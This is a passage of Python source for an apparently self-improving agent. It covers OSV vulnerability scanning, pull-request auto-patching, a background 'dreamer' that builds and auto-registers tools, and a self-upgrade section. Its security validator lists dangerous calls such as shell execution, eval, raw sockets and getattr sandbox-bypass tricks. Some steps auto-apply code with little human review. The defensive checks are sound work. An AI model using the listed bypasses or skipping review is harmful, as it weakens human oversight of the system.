    queries = [{"package": {"name": n, "ecosystem": "PyPI"}, "version": v} for n, v in queryable]
    try:
        response = requests.post(OSV_API_URL, json={"queries": queries}, timeout=30)
        data = response.json()
    except requests.exceptions.RequestException as e:
        return {"ERROR": ["could not reach OSV.dev: " + str(e)]}
    results = data.get("results", [])
    found = {}
    for (name, version), result in zip(queryable, results):
        vulns = result.get("vulns", [])
        if vulns:
            found[name] = [v["id"] for v in vulns]
    return found

def get_osv_fixed_version(vuln_id, package_name):
    """Looks up one OSV vuln ID to find the earliest version that fixes
    it for the given package. Returns a version string, or None if it
    can't be determined."""
    try:
        response = requests.get(OSV_VULN_URL + vuln_id, timeout=20)
        data = response.json()
    except requests.exceptions.RequestException:
        return None
    for affected in data.get("affected", []):
        pkg = affected.get("package", {})
        if pkg.get("name", "").lower() != package_name.lower():
            continue
        for rng in affected.get("ranges", []):
            for event in rng.get("events", []):
                if "fixed" in event:
                    return event["fixed"]
    return None

def scan_dependency_vulnerabilities(requirements_path="requirements.txt"):
    """
    Checks every exact-pinned package in requirements_path against the
    OSV.dev vulnerability database. Reports known CVE/GHSA IDs per
    package so you know what to upgrade — no exploit details.
    """
    packages = _parse_requirements(requirements_path)
    if not packages:
        return "No packages found in " + requirements_path + " (or file doesn't exist)."

    unpinned = [n for n, v in packages if not v]
    found = _query_osv_batch(packages)

    if "ERROR" in found:
        return found["ERROR"][0]

    if not found:
        summary = "No known vulnerabilities found in " + str(len(packages) - len(unpinned)) + " pinned package(s)."
    else:
        lines = ["Vulnerabilities found:"]
        for name, vuln_ids in found.items():
            extra = " (+" + str(len(vuln_ids) - 5) + " more)" if len(vuln_ids) > 5 else ""
            lines.append("  " + name + ": " + ", ".join(vuln_ids[:5]) + extra)
        summary = "\n".join(lines)

    if unpinned:
        extra = " ..." if len(unpinned) > 10 else ""
        summary += "\n\nNot version-pinned (skipped): " + ", ".join(unpinned[:10]) + extra
    return summary

def auto_patch_vulnerable_dependencies(repo_name, requirements_path="requirements.txt"):
    """
    Reads requirements.txt from the repo's default branch, checks pinned
    packages against OSV, and for any with a known fixed version, bumps
    it, commits to a NEW branch, and opens a PR. Never touches the
    default branch directly — a human still reviews and merges.
    """
    username = get_github_username()
    if not username:
        return "Could not determine GitHub username."

    try:
        resp = requests.get(
            "https://raw.githubusercontent.com/" + username + "/" + repo_name + "/main/" + requirements_path,
            timeout=20
        )
        if resp.status_code != 200:
            return "Could not fetch " + requirements_path + " from " + repo_name + " (HTTP " + str(resp.status_code) + ")"
        original_text = resp.text
    except requests.exceptions.RequestException as e:
        return "ERROR: could not reach GitHub (" + str(e) + ")"

    packages = _parse_requirements_text(original_text)
    found = _query_osv_batch(packages)
    if "ERROR" in found:
        return found["ERROR"][0]
    if not found:
        return "No known vulnerabilities found — nothing to patch."

    updated_text = original_text
    patched = []
    for name, vuln_ids in found.items():
        current_version = next((v for n, v in packages if n == name), None)
        if not current_version:
            continue
        fixed_version = get_osv_fixed_version(vuln_ids[0], name)
        if not fixed_version:
            continue
        pattern = re.compile(re.escape(name) + r"\s*==\s*" + re.escape(current_version))
        if pattern.search(updated_text):
            updated_text = pattern.sub(name + "==" + fixed_version, updated_text)
            patched.append(name + " " + current_version + " -> " + fixed_version + " (fixes " + vuln_ids[0] + ")")

    if not patched:
        return "Found vulnerabilities but couldn't determine safe fixed versions for: " + ", ".join(found.keys())

    branch_name = "security-patch-" + str(int(time.time()))
    ok, msg = create_github_branch(repo_name, branch_name)
    if not ok:
        return "Could not create branch: " + msg

    commit_msg = "Security: bump " + str(len(patched)) + " vulnerable dependency(ies)"
    result = create_github_file(repo_name, requirements_path, updated_text, commit_message=commit_msg, branch=branch_name)
    if result.startswith("Could not") or result.startswith("ERROR"):
        return "Could not commit patch: " + result

    pr_body = "Automated security patch (OSV.dev).\n\n" + "\n".join(patched)
    pr_ok, pr_result = create_pull_request(repo_name, commit_msg, branch_name, body=pr_body)
    if not pr_ok:
        return "Committed to " + branch_name + " but could not open PR: " + pr_result

    notify_telegram("Opened security patch PR for " + repo_name + ": " + pr_result)
    return "Opened PR: " + pr_result + "\n" + "\n".join(patched)

def dreamer_can_act():
    return not _main_thread_busy.is_set() and keys_are_free() and len(load_pending_ideas()) < PENDING_IDEAS_CAP

def propose_new_idea():
    tools = load_tools_index()
    existing = "\n".join(t["id"] + ": " + t["idea"] for t in tools) if tools else "(none)"
    lessons = load_lessons()
    pending = load_pending_ideas()
    pending_ideas_text = "\n".join(e.get("idea", "") for e in pending if e.get("idea")) if pending else "(none)"
    return ask_ai(
        "Tools built:\n" + existing +
        "\nAlready pending review:\n" + pending_ideas_text +
        "\nLessons:\n" + (lessons or "(none)") +
        "\n\nSuggest ONE new useful tool idea not already built or pending. Reply in 1-2 sentences only."
    ).strip()

# ============================================================
# WEB-SOURCED IDEAS — keeps the dreamer's idea well fed from the
# live internet instead of only reasoning about its own tool list.
# ============================================================

WEB_IDEA_QUERIES = [
    "useful AI agent tool ideas",
    "trending automation scripts github",
    "small python utility tool ideas",
    "useful free API integrations for AI agents",
    "popular open source CLI tools",
    "useful developer productivity tools",
]
_web_idea_query_index = [0]

def scan_web_for_tool_idea():
    """
    Pulls fresh web search results on a rotating topic (search_web, via
    Firecrawl) and asks the AI to distill ONE concrete, buildable tool
    idea out of them. This is what keeps the dreamer "always on the
    internet" — instead of only ever reasoning about its own existing
    tool list, it periodically looks at what's actually out there right
    now and proposes something based on that.
    Returns an idea string, or None if nothing usable came back.
    """
    query = WEB_IDEA_QUERIES[_web_idea_query_index[0] % len(WEB_IDEA_QUERIES)]
    _web_idea_query_index[0] += 1
    results = search_web(query)
    if (not results or results.startswith("ERROR")
            or results.startswith("Web search failed") or results.startswith("No web results")):
        return None, None

    tools = load_tools_index()
    existing = "\n".join(t["id"] + ": " + t["idea"] for t in tools) if tools else "(none)"
    prompt = (
        "Here are some current web search results:\n" + results +
        "\n\nTools already built:\n" + existing +
        "\n\nBased on these results, suggest ONE new, concrete, buildable tool idea "
        "(something that could be a single self-contained script, or that plausibly "
        "already exists as a small open-source project on GitHub). "
        "It must not duplicate an existing tool. Reply in 1-2 sentences only, "
        "or reply NONE if nothing relevant or buildable stands out."
    )
    idea = ask_ai(prompt).strip()
    if not idea or idea.upper().startswith("NONE"):
        return None, None
    # Return the raw search results alongside the idea so the caller can
    # store them as source_context — grounds this tool's later self-test in
    # what it was actually built from, not just the paraphrased idea line.
    return idea, results

# ============================================================
# TOOL VALIDATOR (security + quality + duplicate check)
# ============================================================

REJECTED_TOOLS_FILE = workpath("rejected_tools.json")

def log_rejected_tool(idea, reason):
    """Silently logs a rejected tool to rejected_tools.json."""
    rejected = read_json_file(REJECTED_TOOLS_FILE, [])
    rejected.append({"idea": idea, "reason": reason, "rejected_at": time.time()})
    write_file(REJECTED_TOOLS_FILE, json.dumps(rejected, indent=2))

def check_security(code):
    """
    Scans code for dangerous patterns using the AST instead of raw text
    matching. This catches things substring matching misses: aliased
    imports (import os as o; o.system(...)), whitespace tricks
    (os .system(...)), shell=True on subprocess.run/call, getattr-based
    bypasses (getattr(__builtins__, "eval")(...)), and restricted module
    imports — not just exact known call strings.
    Returns (passed, reason).
    """
    try:
        tree = ast.parse(code)
    except SyntaxError as e:
        return False, "code does not parse: " + str(e)

    DANGEROUS_NAME_CALLS = {
        "eval": "arbitrary code execution",
        "exec": "arbitrary code execution",
        "compile": "dynamic code compilation",
        "__import__": "dynamic import — can load arbitrary modules",
    }
    DANGEROUS_ATTR_CALLS = {
        ("os", "system"): "shell execution",
        ("os", "popen"): "shell execution",
        ("os", "remove"): "deletes files",
        ("os", "unlink"): "deletes files",
        ("os", "rmdir"): "removes directories",
        ("shutil", "rmtree"): "removes directory tree",
        ("subprocess", "run"): "shell execution",
        ("subprocess", "call"): "shell execution",
        ("subprocess", "Popen"): "shell execution",
        ("subprocess", "check_output"): "shell execution",
        ("subprocess", "check_call"): "shell execution",
        ("socket", "socket"): "raw network socket",
        ("ctypes", "CDLL"): "loads native/compiled code",
        ("pickle", "loads"): "insecure deserialization",
        ("pickle", "load"): "insecure deserialization",
        ("requests", "delete"): "makes DELETE HTTP requests",
        ("os", "chmod"): "changes file permissions",
        ("tempfile", "mktemp"): "insecure temp file creation (race condition) — use mkstemp instead",
        ("marshal", "loads"): "insecure deserialization",
    }
    SHELL_TRUE_ATTRS = {"run", "call", "Popen", "check_call", "check_output"}
    DANGEROUS_MODULES = {"ctypes", "socket", "multiprocessing", "ftplib", "telnetlib"}
    PROTECTED_FILES = {
        SELF_FILE, "tools_index.json", "agent_lessons.txt", "agent_memory.txt",
        "decisions_log.json", "ai_usage_log.json", "api_keys_store.json"
    }
    BYPASS_NAMES = {"eval", "exec", "system", "popen", "__import__", "compile"}

    # Build alias map so "import os as o" / "from os import system as go" still resolve.
    module_alias = {}     # local name -> real module name, e.g. "o" -> "os"
    from_alias = {}        # local name -> (module, original_attr), e.g. "go" -> ("os", "system")
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                local = alias.asname or alias.name.split(".")[0]
                module_alias[local] = alias.name.split(".")[0]
        elif isinstance(node, ast.ImportFrom) and node.module:
            root = node.module.split(".")[0]
            for alias in node.names:
                local = alias.asname or alias.name
                from_alias[local] = (root, alias.name)

    violations = []

    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                root = alias.name.split(".")[0]
                if root in DANGEROUS_MODULES:
                    violations.append("import " + alias.name + " — restricted module")
        elif isinstance(node, ast.ImportFrom) and node.module:
            root = node.module.split(".")[0]
            if root in DANGEROUS_MODULES:
                violations.append("from " + node.module + " import ... — restricted module")

        if isinstance(node, ast.Call):
            func = node.func

            # Direct name calls: eval(...), exec(...), or a from-import alias of a dangerous attr
            if isinstance(func, ast.Name):
                if func.id in DANGEROUS_NAME_CALLS:
                    violations.append(func.id + "() — " + DANGEROUS_NAME_CALLS[func.id])
                elif func.id in from_alias:
                    mod, orig = from_alias[func.id]
                    if (mod, orig) in DANGEROUS_ATTR_CALLS:
                        violations.append(func.id + "() [from " + mod + "." + orig + "] — " + DANGEROUS_ATTR_CALLS[(mod, orig)])
                elif func.id == "getattr":
                    # Two layers: (a) bare dangerous builtin names regardless of
                    # what object they're pulled off (covers things like
                    # getattr(__builtins__, "eval")), and (b) the SAME
                    # (module, attr) table used for direct attribute calls, so
                    # getattr(os, "remove")(...) / getattr(shutil, "rmtree")(...)
                    # can't bypass detection just by not spelling the attr name
                    # literally in source as `os.remove(...)`.
                    attr_arg = node.args[1] if len(node.args) > 1 else None
                    attr_name = attr_arg.value if isinstance(attr_arg, ast.Constant) and isinstance(attr_arg.value, str) else None
                    if attr_name in BYPASS_NAMES:
                        violations.append('getattr(..., "' + attr_name + '") — likely sandbox-bypass attempt')
                    elif attr_name:
                        obj_arg = node.args[0] if node.args else None
                        obj_base = obj_arg.id if isinstance(obj_arg, ast.Name) else None
                        resolved_obj_module = module_alias.get(obj_base, obj_base)
                        if (resolved_obj_module, attr_name) in DANGEROUS_ATTR_CALLS:
                            violations.append('getattr(' + str(obj_base) + ', "' + attr_name + '") — ' +
                                               DANGEROUS_ATTR_CALLS[(resolved_obj_module, attr_name)] + ' (getattr bypass attempt)')

            # Attribute calls: os.system(...), o.system(...) via alias, subprocess.run(shell=True), etc.
            elif isinstance(func, ast.Attribute):
                base_name = func.value.id if isinstance(func.value, ast.Name) else None
                resolved_module = module_alias.get(base_name, base_name)
                key = (resolved_module, func.attr)
                if key in DANGEROUS_ATTR_CALLS:
                    label = (base_name + "." + func.attr) if base_name == resolved_module else (base_name + "." + func.attr + " [alias of " + resolved_module + "]")
                    violations.append(label + "() — " + DANGEROUS_ATTR_CALLS[key])
                if func.attr in SHELL_TRUE_ATTRS:
                    for kw in node.keywords:
                        if kw.arg == "shell" and isinstance(kw.value, ast.Constant) and kw.value.value is True:
                            violations.append(func.attr + "(..., shell=True) — shell injection risk")

                # TLS verification disabled: requests.get/post/etc(..., verify=False)
                if resolved_module == "requests" and func.attr in {"get", "post", "put", "delete", "patch", "request"}:
                    for kw in node.keywords:
                        if kw.arg == "verify" and isinstance(kw.value, ast.Constant) and kw.value.value is False:
                            violations.append("requests." + func.attr + "(..., verify=False) — TLS certificate verification disabled")

                # Unsafe YAML deserialization: yaml.load(...) without a SafeLoader
                if resolved_module == "yaml" and func.attr == "load":
                    safe_loader_used = any(
                        kw.arg == "Loader" and isinstance(kw.value, ast.Attribute) and "Safe" in kw.value.attr
                        for kw in node.keywords
                    )
                    if not safe_loader_used:
                        violations.append("yaml.load(...) without a SafeLoader — unsafe deserialization")

            # open("main.py") / open("../something") on protected or escaping paths
            if (isinstance(func, ast.Name) and func.id == "open") and node.args:
                first = node.args[0]
                if isinstance(first, ast.Constant) and isinstance(first.value, str):
                    target = first.value
                    if os.path.basename(target) in PROTECTED_FILES or ".." in target or target.startswith("/mnt/skills"):
                        violations.append('open("' + target + '") — accesses a protected/agent-internal file')

    if violations:
        # de-dupe while preserving order, cap so the rejection log stays readable
        seen = set()
        unique = []
        for v in violations:
            if v not in seen:
                seen.add(v)
                unique.append(v)
        return False, "; ".join(unique[:5])

    # Hardcoded secret check: only flags an actual string literal assigned to
    # a password/key/token/secret-like variable (e.g. password = "abc123"),
    # not normal uses like input("Enter your password: "), variable names,
    # comments, or code that reads secrets from environment variables.
    hardcoded_secret_pattern = re.compile(
        r"""(?:password|passwd|pwd|api[_-]?key|secret|private[_-]?key|access[_-]?token)\s*"""
        r"""(?:=|:)\s*['"][^'"]{3,}['"]""",
        re.IGNORECASE
    )
    match = hardcoded_secret_pattern.search(code)
    if match:
        return False, "contains a hardcoded secret/credential: " + match.group(0)[:60]

    if "drop table" in code.lower():
        return False, "contains SQL DROP — dangerous"

    return True, ""

def check_quality(code, idea, output):
    """Checks if the tool actually produced meaningful output."""
    if not output or not output.strip():
        return False, "produced no output"
    if len(output.strip()) < 3:
        return False, "output too short to be meaningful"
    error_signals = ["traceback", "error:", "exception:", "syntaxerror", "nameerror", "typeerror"]
    if any(s in output.lower() for s in error_signals):
        return False, "output contains error messages"
    return True, ""

def check_duplicate(idea):
    """Checks if a very similar tool already exists. Returns (is_duplicate, matching_tool)."""
    index = load_tools_index()
    if not index:
        return False, None
    listing = "\n".join(t["id"] + ": " + t["idea"] for t in index)
    prompt = """These tools already exist:
""" + listing + """

New tool idea: """ + idea + """

Is this new idea essentially the same as any existing tool?
Reply with ONLY the matching tool id (e.g. tool_3) if yes, or NONE if genuinely different."""
    answer = ask_ai(prompt).strip()
    for t in index:
        if t["id"] == answer:
            return True, t
    return False, None

def validate_and_register_tool(idea, code, output, source_context=None):
    """
    Runs all checks on a dreamer-suggested tool.
    If all pass: registers it and prints a report.
    If any fail: silently logs rejection, returns None.
    source_context: passed straight through to register_tool() — see its
    docstring. Lets a web-sourced tool's later self-test be grounded in the
    real material it came from.
    """
    # Security check
    sec_pass, sec_reason = check_security(code)
    if not sec_pass:
        log_rejected_tool(idea, "SECURITY: " + sec_reason)
        return None

    # Quality check
    qual_pass, qual_reason = check_quality(code, idea, output)
    if not qual_pass:
        log_rejected_tool(idea, "QUALITY: " + qual_reason)
        return None

    # Duplicate check
    is_dup, matching = check_duplicate(idea)
    if is_dup:
        log_rejected_tool(idea, "DUPLICATE: too similar to " + matching["id"] + " — " + matching["idea"])
        return None

    # All checks passed — register and print report
    tool_id = register_tool(idea, code, source_context=source_context)
    print("\n=== New Tool Added ===")
    print("Tool: \"" + idea + "\"")
    print("ID:   " + tool_id)
    print("Security:  ✅")
    print("Quality:   ✅")
    print("Duplicate: ✅")
    print("======================\n")
    return tool_id

def draft_idea_silently(idea, source_context=None):
    # BUG FIX: this runs from the dreamer thread and shares GENERATED_CODE_FILE
    # with build_and_fix_workflow / red_team_and_fix_one_tool — see
    # _generated_code_file_lock's definition for the full race description.
    # source_context (optional): raw material the idea was drawn from (e.g.
    # scan_web_for_tool_idea()'s search results) — carried through so a
    # later self-test can be grounded in it. See register_tool() docstring.
    with _generated_code_file_lock:
        code = write_code(idea)
        for attempt in range(1, MAX_CODE_ATTEMPTS + 1):
            success, output = run_generated_code()
            if success:
                return {"kind": "new_idea", "idea": idea, "code": read_file(GENERATED_CODE_FILE),
                        "status": "works", "output": output[:500], "created_at": time.time(),
                        "source_context": source_context}
            if attempt < MAX_CODE_ATTEMPTS:
                write_code(idea, previous_error=output)
            else:
                return {"kind": "new_idea", "idea": idea, "code": read_file(GENERATED_CODE_FILE),
                        "status": "failed", "output": output[:500], "created_at": time.time(),
                        "source_context": source_context}
    return None

def generate_adversarial_inputs(tool_idea):
    response = ask_ai("Invent 3 short test inputs that would break a tool for: " + tool_idea + "\nReply with ONLY 3 inputs, one per line.")
    return [l.strip() for l in response.split("\n") if l.strip()][:3]

def red_team_and_fix_one_tool(target_tool=None):
    """
    target_tool: if given, red-team this specific tool dict instead of
    picking one at random. Used by the decay-aware dreamer (FEATURE 1)
    to prioritize fixing tools that are already known to be declining.
    """
    if target_tool is not None:
        tool = target_tool
        # BUG FIX: get_decaying_tools() (the dreamer's decay-aware picker)
        # doesn't filter by type, so a declining/stale github/web/video tool
        # could be passed in here. Everything below indexes tool["filepath"]
        # unguarded and only catches subprocess.TimeoutExpired, so a
        # non-local tool raised an uncaught KeyError and silently killed
        # that dreamer cycle. Bail out cleanly instead — these tools aren't
        # locally fixable anyway (same reasoning as the "not a
        # locally-fixable tool" skip already applied in the Manager loop).
        if tool.get("type", "local") != "local" or not tool.get("filepath"):
            return None
    else:
        local_tools = [t for t in load_tools_index() if t.get("type", "local") == "local"]
        if not local_tools:
            return None
        tool = random.choice(local_tools)
    found_error = None
    for test_input in generate_adversarial_inputs(tool["idea"]):
        try:
            result = subprocess.run(["python3", tool["filepath"]], input=test_input, capture_output=True, text=True, timeout=CODE_TIMEOUT_SECONDS,
                                     preexec_fn=_sandbox_limits if os.name != "nt" else None)
            if result.returncode != 0:
                found_error = result.stderr
                break
        except subprocess.TimeoutExpired:
            found_error = "Timed out on: " + test_input
            break
    if not found_error:
        return None
    original_code = read_file(tool["filepath"])
    # BUG FIX: also dreamer-thread-reachable and shares GENERATED_CODE_FILE
    # with build_and_fix_workflow / draft_idea_silently — see
    # _generated_code_file_lock's definition for the full race description.
    with _generated_code_file_lock:
        write_file(GENERATED_CODE_FILE, original_code)
        fixed_code = None
        for _ in range(MAX_CODE_ATTEMPTS):
            write_code(tool["idea"], previous_error=found_error)
            success, _ = run_generated_code()
            if success:
                fixed_code = read_file(GENERATED_CODE_FILE)
                break
    return {"kind": "tool_fix", "tool_id": tool["id"], "idea": tool["idea"], "old_code": original_code,
            "new_code": fixed_code, "status": "fixed" if fixed_code else "unsolved",
            "found_error": found_error[:500], "created_at": time.time()}

# Budget gate: if a single proposed idea looks like it'll cost more than
# this many total tokens (in+out) to build, the dreamer skips it instead
# of building blind. 0 = no gate.
DREAMER_MAX_ESTIMATED_TOKENS = 10000

# How often (in dreamer cycles) to run a decay check on the tool registry.
DREAMER_DECAY_CHECK_INTERVAL = 10
# Runs far less often than the decay check: a prune sweep can now trigger
# real tool_showdown() calls, and since run_existing_tool() actually
# exercises github/video tools over GitHub Actions (see
# run_existing_github_tool()), a single sweep can legitimately take a
# long time and burn real Actions minutes if the registry has several
# near-duplicate remote-backed tools. 24 cycles * DREAMER_SLEEP_SECONDS
# (300s) ~= every 2 hours.
DREAMER_PRUNE_CHECK_INTERVAL = 24
_dreamer_cycle_count = [0]

# Consecutive-council-REJECT tracker for the idea rotation branch below.
# A single rejected idea just means "not worth building" — but the SAME
# kind of idea getting rejected over and over, cycle after cycle, is a
# different signal: it means the existing tool-building path structurally
# can't produce what's being asked for. That's the "wall" that motivates
# propose_architectural_subsystem() — not a human deciding to call it,
# the dreamer noticing it's stuck.
ARCHITECTURAL_WALL_THRESHOLD = 3
_consecutive_idea_rejects = [0]
_recent_rejected_ideas = []

def dreamer_cycle():
    try:
        _dreamer_cycle_count[0] += 1

        if _dreamer_cycle_count[0] % DREAMER_DECAY_CHECK_INTERVAL == 0:
            decay_report = tool_decay_check()
            if decay_report and decay_report != "No decaying tools found.":
                print("\n[dreamer] tool decay check:\n" + decay_report + "\n")
            retired = auto_retire_dead_tools()
            if retired:
                print("[dreamer] auto-retired long-dead tools: " + ", ".join(retired))

        if _main_thread_busy.is_set():
            return  # user started typing — bail before doing any costly/file-mutating work

        # FEATURE: long-term agenda. Human-approved goals get revisited
        # periodically without needing re-approval each time — separate
        # from and lower-frequency than the normal build/fix/scan rotation
        # below, so it doesn't crowd that out.
        if _dreamer_cycle_count[0] % AGENDA_REVISIT_INTERVAL == 0:
            revisit_agenda_goal()
            if _main_thread_busy.is_set():
                return  # user started typing while the goal ran

        if _dreamer_cycle_count[0] % DREAMER_PRUNE_CHECK_INTERVAL == 0:
            prune_report = auto_prune_duplicates()
            if prune_report and prune_report not in (
                    "Not enough tools to compare.",
                    "No near-duplicate tools found (similarity threshold 0.6)."):
                print("\n[dreamer] auto-prune sweep:\n" + prune_report + "\n")
            if _main_thread_busy.is_set():
                return  # user started typing while the (potentially slow) sweep ran

        # FEATURE 1: decay-aware scoring. A declining/failing tool is a
        # known, concrete problem — fixing it is worth more than a guess
        # at a brand-new idea, so it preempts the normal alternating
        # build/red-team behavior whenever one exists.
        decaying = get_decaying_tools()
        only_actively_failing = [f for f in decaying if f["reason"] == "declining"]

        if only_actively_failing:
            worst = only_actively_failing[0]["tool"]
            entry = red_team_and_fix_one_tool(target_tool=worst)
            if entry:
                if not add_pending_idea(entry, cap=PENDING_IDEAS_CAP):
                    print("[dreamer] pending-ideas queue full, dropping fix for " + worst["id"])
            return

        # Re-check: the decay check above is local/cheap, but it's still a
        # gap where the user could have started typing.
        if _main_thread_busy.is_set():
            return  # user started typing mid-cycle — bail before doing any costly work

        # Rotate evenly through the three behaviors using the cycle counter,
        # not wall-clock time. int(time.time()) % 3 used to be the selector
        # here, but DREAMER_SLEEP_SECONDS (300) divides evenly by 3, so the
        # residue barely changed between cycles — the dreamer could get
        # stuck silently repeating one behavior (e.g. never proposing new
        # ideas) for very long stretches. The counter guarantees real
        # rotation regardless of timing.
        rotation = _dreamer_cycle_count[0] % 3
        if rotation == 0:
            idea = propose_new_idea()
            if idea:
                if DREAMER_MAX_ESTIMATED_TOKENS:
                    _, total_in, total_out, _ = estimate_tokens_for(idea)
                    if (total_in + total_out) > DREAMER_MAX_ESTIMATED_TOKENS:
                        print("[dreamer] skipping idea over budget (~" + str(int(total_in + total_out)) + " tokens): " + idea)
                        log_rejected_tool(idea, "BUDGET: estimated " + str(int(total_in + total_out)) + " tokens exceeds DREAMER_MAX_ESTIMATED_TOKENS")
                        return
                # Gate through the council before spending build effort on it.
                # A clean REJECT (all three roles + chair agree it's not
                # worth building) skips drafting entirely; APPROVE/REVISE
                # both proceed — REVISE just means the idea wasn't perfect,
                # not that it's not worth attempting.
                verdict = council_debate(idea, context="Proposed new tool idea from the dreamer thread.")
                if verdict["decision"] == "REJECT":
                    print("[dreamer] council rejected idea (" + verdict["id"] + "): " + idea)
                    log_rejected_tool(idea, "COUNCIL REJECT (" + verdict["id"] + "): " + verdict["summary"][:200])
                    # Wall detection: this is a REJECT, not an APPROVE/REVISE,
                    # so bump the streak instead of resetting it.
                    _consecutive_idea_rejects[0] += 1
                    _recent_rejected_ideas.append(idea)
                    del _recent_rejected_ideas[:-ARCHITECTURAL_WALL_THRESHOLD]
                    if _consecutive_idea_rejects[0] >= ARCHITECTURAL_WALL_THRESHOLD:
                        wall = (
                            str(_consecutive_idea_rejects[0]) + " consecutive tool ideas rejected by "
                            "council with the current tool-building path. Recent rejected ideas:\n- " +
                            "\n- ".join(_recent_rejected_ideas)
                        )
                        print("[dreamer] hit a wall — " + str(_consecutive_idea_rejects[0]) +
                              " ideas rejected in a row, proposing an architectural subsystem instead")
                        result = propose_architectural_subsystem(wall)
                        print("[dreamer] architectural proposal: " + result)
                        _consecutive_idea_rejects[0] = 0
                        _recent_rejected_ideas.clear()
                    return
                # A non-REJECT verdict means the current path is still
                # working — reset the wall-detection streak.
                _consecutive_idea_rejects[0] = 0
                _recent_rejected_ideas.clear()
                if verdict["dissent"]:
                    print("[dreamer] council " + verdict["decision"] + " with dissent from " + ", ".join(verdict["dissent"]) + " (" + verdict["id"] + "): " + idea)
                entry = draft_idea_silently(idea)
                if entry:
                    if not add_pending_idea(entry, cap=PENDING_IDEAS_CAP):
                        print("[dreamer] pending-ideas queue full, dropping new idea: " + idea)
        elif rotation == 1:
            entry = red_team_and_fix_one_tool()
            if entry:
                if not add_pending_idea(entry, cap=PENDING_IDEAS_CAP):
                    print("[dreamer] pending-ideas queue full, dropping fix")
        else:
            # FEATURE: always-on internet source. Pull an idea from a live
            # web search, then try to auto-import a matching tool straight
            # from GitHub (full safety pipeline, no manual approval). If no
            # safe match is found, fall back to writing it from scratch
            # locally, same as the normal idea path.
            idea, web_source = scan_web_for_tool_idea()
            if idea:
                imported = import_github_tool_auto(idea)
                if imported:
                    print("[dreamer] " + imported)
                    return
                print("[dreamer] no safe GitHub match for web idea, drafting locally: " + idea)
                if DREAMER_MAX_ESTIMATED_TOKENS:
                    _, total_in, total_out, _ = estimate_tokens_for(idea)
                    if (total_in + total_out) > DREAMER_MAX_ESTIMATED_TOKENS:
                        print("[dreamer] skipping web idea over budget (~" + str(int(total_in + total_out)) + " tokens): " + idea)
                        log_rejected_tool(idea, "BUDGET: estimated " + str(int(total_in + total_out)) + " tokens exceeds DREAMER_MAX_ESTIMATED_TOKENS")
                        return
                entry = draft_idea_silently(idea, source_context=web_source)
                if entry:
                    if not add_pending_idea(entry, cap=PENDING_IDEAS_CAP):
                        print("[dreamer] pending-ideas queue full, dropping web idea: " + idea)
    except Exception as e:
        print("Dreamer error: " + str(e))

def dreamer_loop():
    while DREAMER_ENABLED:
        time.sleep(DREAMER_SLEEP_SECONDS)
        try:
            if dreamer_can_act():
                dreamer_cycle()
                # Auto-register any completed ideas immediately if main thread is still free
                if not _main_thread_busy.is_set():
                    review_pending_ideas()
        except Exception as e:
            # dreamer_cycle() already catches its own errors, but dreamer_can_act()
            # and review_pending_ideas() don't — without this, a single malformed
            # pending_ideas.json entry kills this thread permanently with no retry.
            print("[dreamer] loop error: " + str(e))

def review_pending_ideas():
    """
    BUG FIX: this used to do `remaining = []` (never appended to) and end
    with `save_pending_ideas(remaining)` — i.e. it ALWAYS overwrote
    pending_ideas.json with an empty list once review finished, no matter
    what. That's fine when nothing else can touch the file mid-review...
    except something can: main_loop() calls `_main_thread_busy.clear()`
    immediately BEFORE calling this function (see end of main_loop), which
    is exactly the signal dreamer_can_act() watches for. If the dreamer
    thread wakes in that window and calls add_pending_idea() while this
    function is still working through validate_and_register_tool() (which
    actually runs code and can take a while), that brand-new idea gets
    silently erased the moment this function's stale snapshot is saved.
    Fix: re-read the file under the lock at save time and only drop the
    entries we actually processed, preserving anything appended since.
    """
    ideas = load_pending_ideas()
    if not ideas:
        return
    print("\nDreamer came up with " + str(len(ideas)) + " thing(s) — reviewing now...\n")
    for entry in ideas:
        if entry["kind"] == "new_idea":
            if entry["status"] != "works":
                # Failed to run — skip silently
                log_rejected_tool(entry["idea"], "QUALITY: code never ran successfully")
                continue
            # Run full validator — auto-registers if passes, logs rejection if not
            validate_and_register_tool(entry["idea"], entry["code"], entry["output"],
                                        source_context=entry.get("source_context"))

        elif entry["kind"] == "tool_fix":
            print("TOOL FIX: " + entry["tool_id"] + " (" + entry["idea"] + ")")
            print("Problem: " + entry["found_error"][:300])
            if entry["status"] == "fixed":
                for t in load_tools_index():
                    if t["id"] == entry["tool_id"]:
                        write_file(t["filepath"], entry["new_code"])
                        print("Patch auto-applied.")
                        break
            else:
                print("Could not auto-fix.")
            print("---")
    with _pending_ideas_lock:
        current = read_json_file(PENDING_IDEAS_FILE, [])
        if current[:len(ideas)] == ideas:
            # Common case: nothing removed our batch out from under us, any
            # extra entries at the end were appended while we were working.
            remaining = current[len(ideas):]
        else:
            # Unexpected interleaving — fall back to keeping anything that
            # wasn't part of the batch we just processed, by identity.
            remaining = [e for e in current if e not in ideas]
        write_file(PENDING_IDEAS_FILE, json.dumps(remaining, indent=2))

# ============================================================
# SELF-UPGRADE
# ============================================================

def reflect_on_patterns():
    history = load_history()
    if not history:
        return "No history yet."
    prompt = """Past requests:
""" + history[-4000:] + """

Find a REPEATED pattern. If found:
PATTERN: <description>
COMMAND_NAME: <single word>
EXAMPLE_USAGE: <example>

If none: NONE"""
    return ask_ai(prompt).strip()

def propose_new_command(pattern_description, command_name):
    return ask_ai("""Write handle_""" + command_name + """(arg) implementing: """ + pattern_description + """
Can use: search_web, fetch_url, summarize_url, write_file, ask_ai, calculate.
Reply:
FUNCTION:
<code>
MAIN_LOOP_BRANCH:
<elif block>""")

def backup_main():
    """Snapshots the CURRENTLY RUNNING file (main.py at the root, or
    agent.py inside a spawned agent — see SELF_FILE) before any
    self-upgrade touches it, and prunes old snapshots so the workspace
    doesn't fill up with backups forever."""
    shutil.copy(workpath(SELF_FILE), workpath(BACKUP_PREFIX + str(int(time.time()))))
    _prune_old_backups()

def _prune_old_backups(keep=MAX_BACKUPS_KEPT):
    backups = sorted([f for f in os.listdir(workpath(".") or ".") if f.startswith(BACKUP_PREFIX)])
    extra = backups[:-keep] if len(backups) > keep else []
    for f in extra:
        try:
            os.remove(workpath(f))
        except OSError:
            pass

def list_backups():
    return sorted([f for f in os.listdir(workpath(".") or ".") if f.startswith(BACKUP_PREFIX)])

def _latest_backup():
    backups = list_backups()
    return backups[-1] if backups else None

def restore_latest_backup():
    """Manually roll back to the most recent backup of the running
    file. Returns (ok, message). Used by the 'rollback' command and as
    the shared rollback path for every self-upgrade function."""
    backup = _latest_backup()
